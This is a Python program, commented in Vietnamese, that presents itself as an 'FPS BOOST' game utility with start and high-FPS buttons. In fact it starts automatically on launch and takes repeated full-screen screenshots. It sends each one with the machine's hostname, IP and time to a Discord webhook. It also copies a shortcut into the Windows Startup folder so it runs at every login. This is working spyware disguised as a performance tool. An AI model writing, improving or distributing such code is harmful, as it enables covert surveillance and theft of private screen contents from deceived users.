import tkinter as tk
from threading import Thread
import pyautogui
import requests
import os
import time
import socket
import tempfile
import sys
from datetime import datetime

WEBHOOK_URL = '-NOI DE LINK WEDHOK-'

is_running = False
high_fps = False

def get_hostname_ip():
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    return hostname, ip

def chup_man_hinh():
    temp_file = tempfile.NamedTemporaryFile(suffix=".jpg", delete=False)
    path = temp_file.name
    temp_file.close()
    pyautogui.screenshot().save(path, "JPEG", quality=60)
    return path

def gui_anh_discord(duong_dan_anh, hostname, ip):
    try:
        with open(duong_dan_anh, 'rb') as f:
            files = {'file': (os.path.basename(duong_dan_anh), f)}
            timestamp = datetime.now().strftime("%H:%M:%S %d-%m-%Y")
            data = {
                'content': f'🖥 Máy: `{hostname}`\n🌐 IP: `{ip}`\n⏰ Thời gian: `{timestamp}`\n📸 KHÔNG CÓ DỤ BOOST FPS ĐÂU'
            }
            requests.post(WEBHOOK_URL, data=data, files=files)
    finally:
        if os.path.exists(duong_dan_anh):
            os.remove(duong_dan_anh)

def chup_lien_tuc():
    global is_running, high_fps
    hostname, ip = get_hostname_ip()
    while is_running:
        path = chup_man_hinh()
        gui_anh_discord(path, hostname, ip)
        time.sleep(0.3 if high_fps else 2)

def toggle_start():
    global is_running
    if not is_running:
        is_running = True
        start_button.config(text="🛑 Dừng", bg="#dc3545")
        status_label.config(text="⏳ Đang chạy...", fg="green")
        Thread(target=chup_lien_tuc, daemon=True).start()
    else:
        is_running = False
        start_button.config(text="▶️ Bắt đầu", bg="#28a745")
        status_label.config(text="⏹ Đã dừng", fg="red")

def toggle_fps():
    global high_fps
    high_fps = not high_fps
    fps_button.config(text="🎯 FPS Cao: BẬT" if high_fps else "🎯 FPS Cao: TẮT")

def cap_nhat_thoi_gian():
    current_time = time.strftime("%H:%M:%S - %d/%m/%Y")
    time_label.config(text=f"🕒 {current_time}")
    root.after(1000, cap_nhat_thoi_gian)

def them_vao_khoi_dong():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    duong_dan_chay = sys.argv[0]
    if duong_dan_chay.endswith(".py"):
        return

    shortcut_path = os.path.join(startup_folder, "AutoScreenshot.lnk")
    if not os.path.exists(shortcut_path):
        try:
            import pythoncom
            from win32com.client import Dispatch
            shell = Dispatch('WScript.Shell')
            shortcut = shell.CreateShortCut(shortcut_path)
            shortcut.Targetpath = duong_dan_chay
            shortcut.WorkingDirectory = os.path.dirname(duong_dan_chay)
            shortcut.IconLocation = duong_dan_chay
            shortcut.save()
        except Exception as e:
            print("❌ Lỗi khi thêm vào khởi động:", e)


root = tk.Tk()
root.title("FPS BOOST")
root.geometry("350x260")
root.resizable(False, False)
root.configure(bg="#f8f9fa")


start_button = tk.Button(root, text="▶️ Bắt đầu", font=("Segoe UI", 13, "bold"), width=20, bg="#28a745", fg="white", command=toggle_start)
start_button.pack(pady=15)


fps_button = tk.Button(root, text="🎯 FPS Cao: TẮT", font=("Segoe UI", 11), width=20, bg="#007bff", fg="white", command=toggle_fps)
fps_button.pack(pady=5)


status_label = tk.Label(root, text="🔌 Chưa chạy", font=("Segoe UI", 12), fg="gray", bg="#f8f9fa")
status_label.pack(pady=10)


time_label = tk.Label(root, text="", font=("Segoe UI", 11), fg="#343a40", bg="#f8f9fa")
time_label.pack()


them_vao_khoi_dong()


toggle_start()

cap_nhat_thoi_gian()

root.mainloop()
